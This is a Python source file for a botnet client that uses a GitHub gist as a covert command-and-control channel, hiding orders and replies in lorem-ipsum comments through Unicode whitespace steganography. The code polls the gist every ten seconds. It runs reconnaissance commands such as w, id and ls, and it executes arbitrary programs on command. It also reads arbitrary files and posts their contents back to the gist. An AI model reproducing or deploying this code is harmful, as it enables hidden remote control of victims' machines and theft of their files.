import threading
import subprocess
from github import Github
import pyUnicodeSteganography as usteg
import lorem
import random

g = Github("") # INSERT YOUR TOKEN HERE
gist = g.get_gist('16f8ed1319b10a550451060d5a56d493')
no_comments = gist.comments
botname = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz123456789", k=8))

def process_orders(c):
    order = None
    try:
        order = usteg.decode(c.body, method='snow').split()
    except:
        order = ["-"]

    if len(order) < 2 and order[0] != "CONTROL":
        return

    print(order)

    if order[1] == "w":
        res = subprocess.run("w", text=True, shell=True,
                             capture_output=True).stdout
        metadata = usteg.encode(lorem.sentence(), "BOT TEXT")
        enc = usteg.encode(metadata, res, method='snow')
        gist.create_comment(enc)
    elif order[1] == "ls":
        res = subprocess.run(
            "ls "+order[2].strip(), text=True, shell=True, capture_output=True).stdout
        metadata = usteg.encode(lorem.sentence(), "BOT TEXT")
        enc = usteg.encode(metadata, res, method='snow')
        gist.create_comment(enc)
    elif order[1] == "id":
        res = subprocess.run("id", text=True, shell=True,
                             capture_output=True).stdout
        metadata = usteg.encode(lorem.sentence(), "BOT TEXT")
        enc = usteg.encode(metadata, res, method='snow')
        gist.create_comment(enc)
    elif order[1] == "cp":
        try:
            with open(order[2], 'rb') as f:
                data = f.read()
                metadata = usteg.encode(lorem.sentence(), "BOT DATA "+order[2])
                enc = usteg.encode(metadata, data, binary=True, method='snow')
                gist.create_comment(enc)
        except:
            pass
    elif order[1] == "ex":
        try:
            subprocess.run(order[2])
        except:
            pass


def get_orders():
    global no_comments
    gist = g.get_gist('16f8ed1319b10a550451060d5a56d493')
    no_msgs_to_process = gist.comments - no_comments
    no_comments = gist.comments

    ping = usteg.encode(lorem.sentence(), "BOT PING "+botname)
    gist.create_comment(ping)

    i = 0
    for c in gist.get_comments().reversed:
        if i == no_msgs_to_process:
            break
        process_orders(c)
        i += 1

    threading.Timer(10, get_orders).start()


get_orders()
